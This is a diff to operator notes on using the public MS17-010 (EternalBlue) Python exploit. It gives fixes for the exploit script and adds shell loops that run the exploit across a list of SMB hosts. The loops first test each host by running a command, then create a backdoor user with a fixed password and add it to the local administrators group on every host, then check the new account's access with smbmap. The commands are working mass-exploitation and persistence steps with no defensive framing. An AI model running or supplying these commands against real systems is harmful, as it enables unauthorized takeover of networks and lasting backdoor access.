@@ -8,3 +8,13 @@ Use the .zip in the repo, it works.
 git clone https://github.com/mez-0/MS17-010-Python
 	-As of 25JAN20, need to add global var to zzz_exploit.py, just add "  domain = ''    " after includes
 	-Also need to add "    found_pipe = ''   " to found_pipe func, its broken in the current mez-0 version, fixed in my zip
+	
+	
+#xarg loop to check for vuln hosts
+cat ../smb-hosts.txt | xargs -L 1 -I {} ./zzz_exploit.py -t {} -c hostname
+
+#admin/user account builder loop, add -u and -p if you can osint some creds through alternate means for better traction
+cat ../smb-hosts.txt | xargs -L 1 -I {} ./zzz_exploit.py -t {} -c 'net user /add chonker kitten & net localgroup administrator chonker /add'
+
+#smbmap checker for above, looking for "Shared", "Users", etc for it to work. Admin rights might not work, but should create lowpriv foothold account at least.
+cat ../smb-hosts.txt | xargs -L 1 -I {} smbmap -u chonker -p kitten -H {}
